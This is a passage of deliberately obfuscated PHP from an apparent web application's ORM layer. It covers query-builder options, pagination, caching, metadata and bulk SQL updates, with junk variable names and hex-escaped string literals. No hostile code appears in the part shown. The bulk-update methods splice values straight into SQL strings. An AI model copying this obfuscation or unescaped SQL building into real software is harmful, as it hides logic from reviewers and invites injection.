array_merge($this->options[$‚—ëÄí³[284]], $åì¨ÑÔª); } else { $this->options[$‚—ëÄí³[284]] = $åì¨ÑÔª; } return $this; } public function limit($É«ü„×, $´ã©ƒ™¦ = null) { $øıòÉÏØ =& $_SERVER[ñ÷§¡å]; $this->options[$øıòÉÏØ[301]] = is_null($´ã©ƒ™¦) ? $É«ü„× : $É«ü„× . $øıòÉÏØ[50] . $´ã©ƒ™¦; return $this; } public function page($úı•Í±©, $ÚëÜà©§ = null) { $Ìú×Ç…è =& $_SERVER[ñ÷§¡å]; $this->options[$Ìú×Ç…è[362]] = is_null($ÚëÜà©§) ? $úı•Í±© : $úı•Í±© . $Ìú×Ç…è[50] . $ÚëÜà©§; return $this; } public function comment($”¢çííú) { $this->options[$_SERVER[ñ÷§¡å][363]] = $”¢çííú; return $this; } public function setProperty($×¼µÊ÷ú, $õóİä–ì) { if (property_exists($this, $×¼µÊ÷ú)) { $this->{$×¼µÊ÷ú} = $õóİä–ì; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\124\x69\155\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\164\x2c\x75\x70\144\141\x74\145", "\x66\165\156\143\x74\151\x6f\156"), array("\143\162\145\x61\164\x65\124\151\155\x65", "\x74\x69\155\x65", "\151\156\163\145\x72\x74", "\146\x75\156\143\x74\x69\x6f\156")); public function setDataAuto($¢«¯Ô‚) { $this->dataAuto = $¢«¯Ô‚; } public function __construct($š¥„ØÚŞ = '', $÷™Õ…ÍÓ = '', $­òİ×ß  = '') { parent::__construct($š¥„ØÚŞ, $÷™Õ…ÍÓ, $­òİ×ß ); } protected $tableMeta = array(); protected function _beforeInsert(&$€Õ‘¥‰Ö, $£Ôü³¸) { $¥ú©‡ =& $_SERVER[ñ÷§¡å]; if (!$this->checkDataAutoHas($¥ú©‡[364])) { return; } $this->dataBeforeFilter($€Õ‘¥‰Ö, $¥ú©‡[364]); } protected function _beforeUpdate(&$ÎâÛŠø×, $Ê¬şåìš) { $Îö²ë¼ =& $_SERVER[ñ÷§¡å]; if (!$this->checkDataAutoHas($Îö²ë¼[365])) { return; } $this->dataBeforeFilter($ÎâÛŠø×, $Îö²ë¼[365]); } protected function _afterSelect(&$ô¯³‚Ãû, $‡·ßÄúî) { if (!is_array($ô¯³‚Ãû)) { return; } if (!$this->checkDataAutoHas($_SERVER[ñ÷§¡å][366])) { return; } foreach ($ô¯³‚Ãû as &$¦¿˜Ö²Õ) { $this->dataAfterFilter($¦¿˜Ö²Õ); } unset($¦¿˜Ö²Õ); } protected function _afterFind(&$£ª­€, $£î×ÒÒ) { if (!is_array($£ª­€)) { return; } if (!$this->checkDataAutoHas($_SERVER[ñ÷§¡å][366])) { return; } $this->dataAfterFilter($£ª­€); } public static function textEncode($ø·ã¡¾) { if (!$ø·ã¡¾) { return $ø·ã¡¾; } $Ş½Ÿ× = json_encode($ø·ã¡¾); $Ş½Ÿ× = preg_replace_callback($_SERVER[ñ÷§¡å][367], function ($õóÃ©àÉ) { return addslashes($õóÃ©àÉ[0]); }, $Ş½Ÿ×); return json_decode($Ş½Ÿ×); } public static function textDecode($ˆª‘È£ı) { $˜Ç®Õ â =& $_SERVER[ñ÷§¡å]; $¾“•ÈîÊ = json_encode($ˆª‘È£ı); $¾“•ÈîÊ = preg_replace_callback($˜Ç®Õ â[368], function ($™¸Ÿ—½ç) { return $_SERVER[ñ÷§¡å][107]; }, $¾“•ÈîÊ); return json_decode($¾“•ÈîÊ); } public function setAutoIncrement($Ä·µŠµâ) { $ˆ×ŒøÍº = array($this->getPk() => $Ä·µŠµâ); $«¼ˆ”¨ë = $this->data($ˆ×ŒøÍº)->add(); if ($«¼ˆ”¨ë) { $this->delete($«¼ˆ”¨ë); } } public function getAutoIncrement() { $„ÊßèòÌ = $this->getTableName(); $óÖˆòğŠ = $this->max($this->getPk()); $…ûÈ’ı» = $this->query("\x73\x68\x6f\x77\x20\164\141\x62\154\x65\x20\163\x74\x61\x74\165\163\x20\x77\150\145\162\145\x20\x4e\x61\x6d\x65\x3d\x27{$„ÊßèòÌ}\47"); $ÔÇá–Í¬ = $…ûÈ’ı»[0][$_SERVER[ñ÷§¡å][369]]; $ûÈ©îİ× = max($óÖˆòğŠ, $ÔÇá–Í¬); return $ûÈ©îİ×; } protected function _callBefore($ïŞÓÏ‘, $Û¿ĞËØÊ) { return $this->cacheCallCheck($ïŞÓÏ‘, $Û¿ĞËØÊ, !1); } protected function _callAfter($–Òªùº, $—¥©î’…) { return $this->cacheCallCheck($–Òªùº, $—¥©î’…, !0); } protected function cacheFunctionAlias($­ŸÏÔ…Ú) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($±†Úã¡ì, $ÂÓ©¡¬ù, $°¶ç³Ö = false) { $êÅãÃÉ¿ = $this->cacheFunctionAlias($ÂÓ©¡¬ù); if (!$êÅãÃÉ¿) { return; } foreach ($êÅãÃÉ¿ as $Ä‚¢³ÙÕ => $ñ“´Œœ) { $üİ±÷øŒ = $ñ“´Œœ[0]; $½á¢ôƒ‚ = explode($_SERVER[ñ÷§¡å][50], $ñ“´Œœ[1]); if ($±†Úã¡ì == $Ä‚¢³ÙÕ) { return $this->cacheFunctionGet($Ä‚¢³ÙÕ, $üİ±÷øŒ); } if ($°¶ç³Ö && in_array($±†Úã¡ì, $½á¢ôƒ‚)) { $this->cacheFunctionClear($Ä‚¢³ÙÕ, $üİ±÷øŒ); } } } public function cacheFunctionGet($ïÚû›µƒ, $úóšğó) { $µŞ…ŸÜ½ = $this->cacheKeyMake($ïÚû›µƒ, $úóšğó); $òõı¡¼ó = Cache::get($µŞ…ŸÜ½); if (!is_array($òõı¡¼ó)) { $òõı¡¼ó = call_user_func_array(array($this, $ïÚû›µƒ), array($úóšğó, !0)); Cache::set($µŞ…ŸÜ½, $òõı¡¼ó); } return $òõı¡¼ó; } public function cacheFunctionClear($Ì› ‚²à, $ƒÈµŠ®ò) { $öâ®ğóú = $ƒÈµŠ®ò; if (!is_array($ƒÈµŠ®ò)) { $öâ®ğóú = array($ƒÈµŠ®ò); } foreach ($öâ®ğóú as $Ú°Â‚óû) { $úù®¯áû = $this->cacheKeyMake($Ì› ‚²à, $Ú°Â‚óû); Cache::remove($úù®¯áû); } } private function cacheKeyMake($¨ Ôê˜–, $©¯¬ì—) { $ÔÛîãªä =& $_SERVER[ñ÷§¡å]; return get_class($this) . $ÔÛîãªä[11] . $¨ Ôê˜– . $ÔÛîãªä[370] . $©¯¬ì—; } protected function selectPageReset() { $»ŠŸñ«Ë =& $_SERVER[ñ÷§¡å]; if (isset($GLOBALS[$»ŠŸñ«Ë[371]])) { return; } $GLOBALS[$»ŠŸñ«Ë[371]] = isset($GLOBALS[$»ŠŸñ«Ë[7]][$»ŠŸñ«Ë[372]]) ? $GLOBALS[$»ŠŸñ«Ë[7]][$»ŠŸñ«Ë[372]] : !1; $GLOBALS[$»ŠŸñ«Ë[373]] = isset($GLOBALS[$»ŠŸñ«Ë[7]][$»ŠŸñ«Ë[362]]) ? $GLOBALS[$»ŠŸñ«Ë[7]][$»ŠŸñ«Ë[362]] : !1; $GLOBALS[$»ŠŸñ«Ë[7]][$»ŠŸñ«Ë[372]] = !1; $GLOBALS[$»ŠŸñ«Ë[7]][$»ŠŸñ«Ë[362]] = !1; } protected function selectPageRestore() { $™øÍ—È =& $_SERVER[ñ÷§¡å]; if (!isset($GLOBALS[$™øÍ—È[371]])) { return; } $GLOBALS[$™øÍ—È[7]][$™øÍ—È[372]] = $GLOBALS[$™øÍ—È[371]]; $GLOBALS[$™øÍ—È[7]][$™øÍ—È[362]] = $GLOBALS[$™øÍ—È[373]]; if ($GLOBALS[$™øÍ—È[7]][$™øÍ—È[372]] === !1) { unset($GLOBALS[$™øÍ—È[7]][$™øÍ—È[372]]); } if ($GLOBALS[$™øÍ—È[7]][$™øÍ—È[362]] === !1) { unset($GLOBALS[$™øÍ—È[7]][$™øÍ—È[362]]); } unset($GLOBALS[$™øÍ—È[371]]); unset($GLOBALS[$™øÍ—È[373]]); } protected function selectPage($±ÉáÍÃ = 200, $È†’¦œù = 1) { $­óÕÙšî =& $_SERVER[ñ÷§¡å]; global $in; $æÌè…Óõ = $this->optionsValue(); $ªğ¨æ¸Ó = 50000; $±ÉáÍÃ = isset($in[$­óÕÙšî[372]]) && $in[$­óÕÙšî[372]] ? $in[$­óÕÙšî[372]] : $±ÉáÍÃ; if ($±ÉáÍÃ === -1) { $in[$­óÕÙšî[372]] = !1; $ªğ¨æ¸Ó = 100000000; $±ÉáÍÃ = $ªğ¨æ¸Ó; } $‘Œ×‚ËÄ = $æÌè…Óõ; $‘Œ×‚ËÄ[$­óÕÙšî[374]] = array(); $±ÉáÍÃ = intval($±ÉáÍÃ); $±ÉáÍÃ = $±ÉáÍÃ <= 5 ? 5 : ($±ÉáÍÃ >= $ªğ¨æ¸Ó ? $ªğ¨æ¸Ó : $±ÉáÍÃ); $È†’¦œù = intval(isset($in[$­óÕÙšî[362]]) && $in[$­óÕÙšî[362]] ? $in[$­óÕÙšî[362]] : $È†’¦œù); $È†’¦œù = $È†’¦œù <= 1 ? 1 : $È†’¦œù; $©®ß“ó = array(); $ê‹ğ–â = 1; if ($È†’¦œù == 1 && $ê‹ğ–â) { $this->optionsValue($æÌè…Óõ); $©®ß“ó = $this->page($È†’¦œù, $±ÉáÍÃ)->select(); $º•ÈŸÂë = is_array($©®ß“ó) ? count($©®ß“ó) : 0; if ($º•ÈŸÂë < $±ÉáÍÃ) { $‹²şŠ»› = 1; } else { $this->optionsValue($‘Œ×‚ËÄ); $º•ÈŸÂë = intval($this->count()); $‹²şŠ»› = ceil($º•ÈŸÂë / $±ÉáÍÃ); } } else { $this->optionsValue($‘Œ×‚ËÄ); $º•ÈŸÂë = intval($this->count()); $‹²şŠ»› = ceil($º•ÈŸÂë / $±ÉáÍÃ); $È†’¦œù = $È†’¦œù >= $‹²şŠ»› ? $‹²şŠ»› : $È†’¦œù; $this->optionsValue($æÌè…Óõ); $©®ß“ó = $this->page($È†’¦œù, $±ÉáÍÃ)->select(); } if (!is_array($©®ß“ó)) { $©®ß“ó = array(); } if ($‹²şŠ»› == 1) { $º•ÈŸÂë = count($©®ß“ó); } $‚¬Ğ„§ = array($­óÕÙšî[375] => array($­óÕÙšî[376] => $º•ÈŸÂë, $­óÕÙšî[372] => $±ÉáÍÃ, $­óÕÙšî[362] => $È†’¦œù, $­óÕÙšî[377] => $‹²şŠ»›), $­óÕÙšî[378] => $©®ß“ó); return $‚¬Ğ„§; } protected function checkLength($îÉ°ƒº, $¡÷óÆÄÙ = 0, $ÄíêÅÏ = '') { $Ûê•âòñ =& $_SERVER[ñ÷§¡å]; $¡÷óÆÄÙ = $¡÷óÆÄÙ ? $¡÷óÆÄÙ : 65536; if (!$îÉ°ƒº || strlen($îÉ°ƒº) < $¡÷óÆÄÙ) { return; } $ÄíêÅÏ = $ÄíêÅÏ ? $ÄíêÅÏ . $Ûê•âòñ[81] : $Ûê•âòñ[12]; show_json($ÄíêÅÏ . LNG($Ûê•âòñ[379]) . "\x28{$¡÷óÆÄÙ}\51", !1); } protected function metaSet($†º‡·ĞÑ, $¤âÅÀûö = null, $„¿ØØ‚´ = null) { $«»ğİº´ =& $_SERVER[ñ÷§¡å]; if (!$this->tableMeta || !$†º‡·ĞÑ) { return !1; } $î®€ìì‚ = $this->tableMeta[$«»ğİº´[380]]; $àÀ«şÔ‡ = $this->tableMeta[$«»ğİº´[381]]; $ë¡ÀÕ¾é = Model($àÀ«şÔ‡); $’ä‘Ôàù = array($î®€ìì‚ => $†º‡·ĞÑ, $«»ğİº´[382] => $¤âÅÀûö); if (is_null($¤âÅÀûö)) { return $ë¡ÀÕ¾é->where(array($î®€ìì‚ => $†º‡·ĞÑ))->delete(); } if (is_null($„¿ØØ‚´) && is_string($¤âÅÀûö)) { return $ë¡ÀÕ¾é->where($’ä‘Ôàù)->delete(); } $€Á®ÕÓÏ = is_array($¤âÅÀûö) ? $¤âÅÀûö : array(); if (is_string($¤âÅÀûö)) { $€Á®ÕÓÏ[$¤âÅÀûö] = $„¿ØØ‚´; } $‘¬„’®™ = array(); foreach ($€Á®ÕÓÏ as $ÎÒùİ¨ã => $ØşŠºÍø) { if (is_null($ØşŠºÍø) && is_string($ÎÒùİ¨ã)) { $ë¡ÀÕ¾é->where(array($î®€ìì‚ => $†º‡·ĞÑ, $«»ğİº´[382] => $ÎÒùİ¨ã))->delete(); continue; } $this->checkLength($ØşŠºÍø, !1, $àÀ«şÔ‡ . $«»ğİº´[4] . $ÎÒùİ¨ã); $‘¬„’®™[] = array($î®€ìì‚ => $†º‡·ĞÑ, $«»ğİº´[104] => $ÎÒùİ¨ã, $«»ğİº´[383] => $ØşŠºÍø); } $Š¿ªøİ™ = $«»ğİº´[384] . $àÀ«şÔ‡; CacheLock::lock($Š¿ªøİ™); $ë¡ÀÕ¾é->where(array($î®€ìì‚ => $†º‡·ĞÑ))->addAll($‘¬„’®™, array(), !0); CacheLock::unlock($Š¿ªøİ™); return !0; } public function metaGet($™©¼¼ãü, $±´• í¨ = false) { $ìÉŠö¦ =& $_SERVER[ñ÷§¡å]; if (!$this->tableMeta) { return array(); } $Â‹Å†Â = $this->tableMeta[$ìÉŠö¦[380]]; $õîÔ¦¥ = Model($this->tableMeta[$ìÉŠö¦[381]]); if ($±´• í¨) { $ÚûÈ±ò† = array($Â‹Å†Â => $™©¼¼ãü, $ìÉŠö¦[104] => $±´• í¨); return $õîÔ¦¥->where($ÚûÈ±ò†)->getField($ìÉŠö¦[383]); } $ÚûÈ±ò† = array($Â‹Å†Â => $™©¼¼ãü); $‡ç—Ü« = $õîÔ¦¥->field($ìÉŠö¦[385])->where($ÚûÈ±ò†)->select(); $‡ç—Ü« = array_to_keyvalue($‡ç—Ü«, $ìÉŠö¦[104], $ìÉŠö¦[383]); return $‡ç—Ü«; } private function checkDataAutoHas($øòš§Ú¾) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $àëæ®åŒ) { if (in_array($øòš§Ú¾, explode($_SERVER[ñ÷§¡å][50], $àëæ®åŒ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÇÅÚÚ, $ªâÄÜÔÜ) { $ªß¿½§‰ =& $_SERVER[ñ÷§¡å]; if (!is_array($ÇÅÚÚ)) { return; } foreach ($this->dataAuto as $¿©Êæòè) { $èı‹„¤ = $¿©Êæòè[0]; if (!in_array($ªâÄÜÔÜ, explode($ªß¿½§‰[50], $¿©Êæòè[2]))) { continue; } switch (trim($¿©Êæòè[3])) { case $ªß¿½§‰[330]: case $ªß¿½§‰[331]: $†¡Ş§ˆÖ = $¿©Êæòè[1]; $óæ”òĞö = isset($¿©Êæòè[4]) ? (array) $¿©Êæòè[4] : array(); if ($†¡Ş§ˆÖ == $ªß¿½§‰[213] && array_key_exists($èı‹„¤, $ÇÅÚÚ)) { if (!$ÇÅÚÚ[$èı‹„¤]) { unset($ÇÅÚÚ[$èı‹„¤]); } break; } if (isset($ÇÅÚÚ[$èı‹„¤])) { array_unshift($óæ”òĞö, $ÇÅÚÚ[$èı‹„¤]); } if ($ªß¿½§‰[330] == $¿©Êæòè[3]) { $ÇÅÚÚ[$èı‹„¤] = call_user_func_array($†¡Ş§ˆÖ, $óæ”òĞö); } else { $ÇÅÚÚ[$èı‹„¤] = call_user_func_array(array(&$this, $†¡Ş§ˆÖ), $óæ”òĞö); } break; case $ªß¿½§‰[279]: if (isset($ÇÅÚÚ[$èı‹„¤]) && $ÇÅÚÚ[$èı‹„¤]) { $ÇÅÚÚ[$èı‹„¤] = call_user_func_array(array(&$this, $¿©Êæòè[1]), array($ÇÅÚÚ[$èı‹„¤])); } break; case $ªß¿½§‰[282]: $ÇÅÚÚ[$èı‹„¤] = $ÇÅÚÚ[$¿©Êæòè[1]]; break; case $ªß¿½§‰[303]: if (isset($ÇÅÚÚ[$èı‹„¤]) && !is_string($ÇÅÚÚ[$èı‹„¤])) { $ÇÅÚÚ[$èı‹„¤] = json_encode_force($ÇÅÚÚ[$èı‹„¤]); } break; case $ªß¿½§‰[332]: if ($ÇÅÚÚ[$èı‹„¤] === $ªß¿½§‰[12]) { unset($ÇÅÚÚ[$èı‹„¤]); } break; case $ªß¿½§‰[333]: $ÇÅÚÚ[$èı‹„¤] = $¿©Êæòè[1]; default: break; } } if ($ªâÄÜÔÜ == $ªß¿½§‰[364]) { $°ª¢ÃÈ± = strtolower($this->db->getDbType()); if (strpos($°ª¢ÃÈ±, $ªß¿½§‰[13]) !== 0) { return; } $ùßêÎ—ş = $this->field(!0)->fields; $Ò™¼êè = $ùßêÎ—ş[$ªß¿½§‰[261]]; if (isset($ùßêÎ—ş[$ªß¿½§‰[260]])) { unset($Ò™¼êè[$ùßêÎ—ş[$ªß¿½§‰[260]]]); } foreach ($Ò™¼êè as $ê°åÓÂë => $ªâÄÜÔÜ) { if (!isset($ÇÅÚÚ[$ê°åÓÂë])) { $ÇÅÚÚ[$ê°åÓÂë] = $ªß¿½§‰[12]; } } } } private function dataAfterFilter(&$îë³ãíÂ) { $«ç—üÃ† =& $_SERVER[ñ÷§¡å]; foreach ($this->dataAuto as $¨¬îŞ·Â) { $Ìç°¸Í³ = $¨¬îŞ·Â[0]; if (!isset($îë³ãíÂ[$Ìç°¸Í³])) { continue; } if (!in_array($«ç—üÃ†[366], explode($«ç—üÃ†[50], $¨¬îŞ·Â[2]))) { continue; } switch (trim($¨¬îŞ·Â[3])) { case $«ç—üÃ†[330]: case $«ç—üÃ†[331]: $÷÷ ˆ‚„ = isset($¨¬îŞ·Â[4]) ? (array) $¨¬îŞ·Â[4] : array(); array_unshift($÷÷ ˆ‚„, $îë³ãíÂ[$Ìç°¸Í³]); if (isset($¨¬îŞ·Â[4]) && $¨¬îŞ·Â[4] == $«ç—üÃ†[386]) { $÷÷ ˆ‚„ = array($îë³ãíÂ[$Ìç°¸Í³]); } if ($«ç—üÃ†[330] == $¨¬îŞ·Â[3]) { $îë³ãíÂ[$Ìç°¸Í³] = call_user_func_array($¨¬îŞ·Â[1], $÷÷ ˆ‚„); } else { $îë³ãíÂ[$Ìç°¸Í³] = call_user_func_array(array(&$this, $¨¬îŞ·Â[1]), $÷÷ ˆ‚„); } break; case $«ç—üÃ†[279]: if (isset($îë³ãíÂ[$Ìç°¸Í³]) && $îë³ãíÂ[$Ìç°¸Í³]) { $îë³ãíÂ[$Ìç°¸Í³] = call_user_func_array(array(&$this, $¨¬îŞ·Â[1]), array($îë³ãíÂ[$Ìç°¸Í³])); } break; case $«ç—üÃ†[282]: $îë³ãíÂ[$Ìç°¸Í³] = $îë³ãíÂ[$¨¬îŞ·Â[1]]; break; case $«ç—üÃ†[303]: $¤·¾×®¼ = $îë³ãíÂ[$Ìç°¸Í³]; $îë³ãíÂ[$Ìç°¸Í³] = json_decode($¤·¾×®¼, !0); if (is_null($îë³ãíÂ[$Ìç°¸Í³])) { $îë³ãíÂ[$Ìç°¸Í³] = $¤·¾×®¼; } break; case $«ç—üÃ†[332]: if ($îë³ãíÂ[$Ìç°¸Í³] === $«ç—üÃ†[12]) { unset($îë³ãíÂ[$Ìç°¸Í³]); } break; case $«ç—üÃ†[333]: $îë³ãíÂ[$Ìç°¸Í³] = $¨¬îŞ·Â[1]; break; default: break; } } } public function saveAll($Ú°ÆÙ‰) { $†Æ„ùú =& $_SERVER[ñ÷§¡å]; $´ãôƒøÆ = $this->tablePrefix . $this->tableName; $ß‡‡îşÔ = self::SQL_WHERE_IN_CHUNK; $Ú°ÆÙ‰ = is_array($Ú°ÆÙ‰) ? $Ú°ÆÙ‰ : array(); $£‰öÖ¨² = $†Æ„ùú[387]; $ßÕ¾è³Œ = 0; $Ë…¥Êí„ = array(); $ƒÖ‡ß÷ = count($Ú°ÆÙ‰); for ($´•›£ÖÜ = 0; $´•›£ÖÜ < $ƒÖ‡ß÷; $´•›£ÖÜ++) { $ó¿áœŒ¡ = $Ú°ÆÙ‰[$´•›£ÖÜ]; if (!is_array($ó¿áœŒ¡) || count($ó¿áœŒ¡) != 4) { continue; } $¤ÇÕ‡ğ‘ = "\125\120\x44\101\x54\105\x20\140{$´ãôƒøÆ}\140\x20\x53\x45\124\40{$ó¿áœŒ¡[2]}\40\75\40\x43\x41\123\105\40{$ó¿áœŒ¡[0]}\x20\xa"; if ($ßÕ¾è³Œ == 0) { $£‰öÖ¨² = $¤ÇÕ‡ğ‘; } $Ë…¥Êí„[] = $†Æ„ùú[128] . $ó¿áœŒ¡[1] . $†Æ„ùú[128]; $ßÕ¾è³Œ++; $£‰öÖ¨² .= "\x20\127\110\x45\116\40\x27{$ó¿áœŒ¡[1]}\x27\40\124\110\x45\116\40\47{$ó¿áœŒ¡[3]}\x27\40\12"; if ($ßÕ¾è³Œ == $ß‡‡îşÔ || $´•›£ÖÜ == $ƒÖ‡ß÷ - 1) { $€şÂ–©Ú = implode($†Æ„ùú[50], $Ë…¥Êí„); $£‰öÖ¨² .= "\40\x45\x4e\x44\x20\x20\x57\110\105\122\105\x20{$ó¿áœŒ¡[0]}\x20\111\x4e\40\x28{$€şÂ–©Ú}\51\40"; $this->execute($£‰öÖ¨²); $ßÕ¾è³Œ = 0; $£‰öÖ¨² = $¤ÇÕ‡ğ‘; $this->chunkEventCheck(count($Ë…¥Êí„)); $Ë…¥Êí„ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÓŒ¯¾‚) { $¥º•¯ä™ =& $_SERVER[ñ÷§¡å]; $îß×Ãµ¿ = $this->tablePrefix . $this->tableName; foreach ($ÓŒ¯¾‚ as $Ôû°”×¦) { if (!is_array($Ôû°”×¦) || count($Ôû°”×¦) != 4) { continue; } $Æä©ê‡ß = $Ôû°”×¦[0] . $¥º•¯ä™[388] . $Ôû°”×¦[1] . $¥º•¯ä™[128]; $åğ°Îï¨ = $Ôû°”×¦[2] . $¥º•¯ä™[388] . $Ôû°”×¦[3] . $¥º•¯ä™[128]; $¿…ÚåÈ£ = "\x75\x70\x64\141\164\x65\x20{$îß×Ãµ¿}\40\x73\x65\164\x20{$åğ°Îï¨}\40\x77\x68\x65\162\x65\x20{$Æä©ê‡ß}\x3b"; $this->execute($¿…ÚåÈ£); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($İ½Ä©‡Ä = false, $’Õùùå¶ = false) { $this->_chunkEvent = $İ½Ä©‡Ä; $this->_chunkEventParam = $’Õùùå¶; } private function chunkEventCheck($ªƒÂï¹) { if (!$this->_chunkEvent) { return; } $‚öÅ³è = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‚öÅ³è[$_SERVER[ñ÷§¡å][389]] = $ªƒÂï¹; Hook::trigger($this->_chunkEvent, $‚öÅ³è); } public function addAll($²ôÜß¼, $•å¦‰× = array(), $É–ŸÏö = false) { $ìÏÎÔÓ =& $_SERVER[ñ÷§¡å]; ignore_timeout(); $’ú•»Õİ = self::SQL_WHERE_IN_CHUNK; if (empty($²ôÜß¼)) { $this->error = think_lang($ìÏÎÔÓ[280]); return !1; } $•å¦‰× = $this->_parseOptions($•å¦‰×); foreach ($²ôÜß¼ as $ööÚú => $§õê·ì) { $²ôÜß¼[$ööÚú] = $this->_facade($§õê·ì); $this->_beforeInsert($²ôÜß¼[$ööÚú], $•å¦‰×); } if (method_exists($this->db, $ìÏÎÔÓ[281])) { for ($Šû÷ñÆş = 0; $Šû÷ñÆş < count($²ôÜß¼); $Šû÷ñÆş += $’ú•»Õİ) { $ÎéİÉ«Ù = array_slice($²ôÜß¼, $Šû÷ñÆş, $’ú•»Õİ); if (!is_array($ÎéİÉ«Ù) || count($ÎéİÉ«Ù) == 0) { break; } $™×Ôì„Ø = $this->db->insertAll($ÎéİÉ«Ù, $•å¦‰×, $É–ŸÏö); $this->chunkEventCheck(count($ÎéİÉ«Ù)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($²ôÜß¼ as $ööÚú => $§õê·ì) { $™×Ôì„Ø = $this->db->insert($§õê·ì, $•å¦‰×, $É–ŸÏö); } $this->commit(); } if (!1 !== $™×Ôì„Ø) { $¹òüüøÙ = $this->getLastInsID(); if ($¹òüüøÙ) { return $¹òüüøÙ; } } return $™×Ôì„Ø; } public function save($ÌãÃË¯‹ = '', $ƒùÌß¶º = array()) { $ĞäÃ¸íÆ =& $_SERVER[ñ÷§¡å]; $Òı¨²¢ = self::SQL_WHERE_IN_CHUNK; $™ÏÂÄĞú = $this->optionsValue(); $úø™ã†ï = $this->findWhereField($™ÏÂÄĞú); if (!$úø™ã†ï) { return parent::save($ÌãÃË¯‹, $ƒùÌß¶º); } $ü©İâñ = 0; $¸‰ØºÙÉ = $™ÏÂÄĞú[$ĞäÃ¸íÆ[284]][$úø™ã†ï][1]; $¸‰ØºÙÉ = is_array($¸‰ØºÙÉ) ? $¸‰ØºÙÉ : array(); $õ¥Ûª¥ = count($¸‰ØºÙÉ); for ($ü¦ìÁ‰Û = 0; $ü¦ìÁ‰Û < $õ¥Ûª¥; $ü¦ìÁ‰Û += $Òı¨²¢) { $¾´åŠ‰– = array_slice($¸‰ØºÙÉ, $ü¦ìÁ‰Û, $Òı¨²¢); if (!is_array($¾´åŠ‰–) || count($¾´åŠ‰–) == 0) { break; } $™ÏÂÄĞú[$ĞäÃ¸íÆ[284]][$úø™ã†ï][1] = $¾´åŠ‰–; $this->optionsValue($™ÏÂÄĞú); $ü©İâñ += parent::save($ÌãÃË¯‹, $ƒùÌß¶º); $this->chunkEventCheck(count($¾´åŠ‰–)); } $this->chunkEventSet(); return $ü©İâñ; } public function add($ÉŠí³©¬ = '', $š‘ñ™ØÂ = array(), $´ó €ª = false) { if ($this->addTaskStatus && is_array($ÉŠí³©¬)) { $this->addTaskData[] = $ÉŠí³©¬; return; } return parent::add($ÉŠí³©¬, $š‘ñ™ØÂ, $´ó €ª); } public function parseWhereLike($¬Áâ›´, $©Ù³‚… = '', $İ‹¼ñ‹ = false, &$ñ‚ÔÎåØ = false) { $É¾í©ˆï =& $_SERVER[ñ÷§¡å]; $ÄÀæ˜É– = $GLOBALS[$É¾í©ˆï[6]][$É¾í©ˆï[390]]; if (!$ÄÀæ˜É–[$É¾í©ˆï[391]]) { return $¬Áâ›´; } if (!is_array($¬Áâ›´)) { return $¬Áâ›´; } $ı£›¹é× = array(); $Øø¼³‚¿ = 0; foreach ($¬Áâ›´ as $ÔòŒñÉÌ => $éÄğù÷‚) { if (is_array($éÄğù÷‚) && count($éÄğù÷‚) == 2 && $éÄğù÷‚[0] == $É¾í©ˆï[392] && is_string($éÄğù÷‚[1]) && substr($éÄğù÷‚[1], 0, 1) == $É¾í©ˆï[393] && substr($éÄğù÷‚[1], strlen($éÄğù÷‚[1]) - 1, 1) == $É¾í©ˆï[393]) { $ñ‚ÔÎåØ = !0; $«óÑ½• = is_string($ÔòŒñÉÌ) ? $ÔòŒñÉÌ : $©Ù³‚…; $¸û–Æü± = substr($éÄğù÷‚[1], 1, strlen($éÄğù÷‚[1]) - 2); $¸û–Æü± = $this->db->escapeString($¸û–Æü±); if (!strpos($«óÑ½•, $É¾í©ˆï[10])) { $«óÑ½• = $É¾í©ˆï[394] . $«óÑ½• . $É¾í©ˆï[394]; } $·ÊÁØ½Ğ = $É¾í©ˆï[198] . $¸û–Æü± . $É¾í©ˆï[198]; $¸û–Æü± = str_replace(array($É¾í©ˆï[10], $É¾í©ˆï[395], $É¾í©ˆï[11]), $É¾í©ˆï[396], $¸û–Æü±); if ($ÄÀæ˜É–[$É¾í©ˆï[397]]) { $·ÊÁØ½Ğ = $É¾í©ˆï[398] . $¸û–Æü± . $É¾í©ˆï[399]; if ($ÄÀæ˜É–[$É¾í©ˆï[400]]) { $·ÊÁØ½Ğ = $É¾í©ˆï[399] . $¸û–Æü± . $É¾í©ˆï[398]; } } $ı£›¹é×[$Øø¼³‚¿] = $É¾í©ˆï[401] . $«óÑ½• . $É¾í©ˆï[402] . $·ÊÁØ½Ğ . $É¾í©ˆï[403]; $Øø¼³‚¿++; continue; } if (is_array($éÄğù÷‚)) { $©Ù³‚… = is_string($ÔòŒñÉÌ) ? $ÔòŒñÉÌ : $©Ù³‚…; $éÄğù÷‚ = $this->parseWhereLike($éÄğù÷‚, $©Ù³‚…, !0, $ñ‚ÔÎåØ); } if (is_numeric($ÔòŒñÉÌ)) { $ı£›¹é×[$Øø¼³‚¿] = $éÄğù÷‚; $Øø¼³‚¿++; } else { $ı£›¹é×[$ÔòŒñÉÌ] = $éÄğù÷‚; } } if ($ñ‚ÔÎåØ && !$İ‹¼ñ‹) { } return $ı£›¹é×; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Úô‡ƒò® = array()) { $ßâæıÏú =& $_SERVER[ñ÷§¡å]; $Ïù—¤ÎÎ = self::SQL_WHERE_IN_CHUNK; $–õİ™¨© = $this->optionsValue(); $üÇ·Æš = $this->findWhereField($–õİ™¨©); if (!$üÇ·Æš || isset($–õİ™¨©[$ßâæıÏú[301]]) || isset($–õİ™¨©[$ßâæıÏú[362]])) { return parent::select($Úô‡ƒò®); } $ÕÍÀ¿öù = $–õİ™¨©[$ßâæıÏú[284]][$üÇ·Æš][1]; $ÕÍÀ¿öù = is_array($ÕÍÀ¿öù) ? $ÕÍÀ¿öù : array(); $¢µÂ±Ÿù = null; for ($ŞíŠ¯ò× = 0; 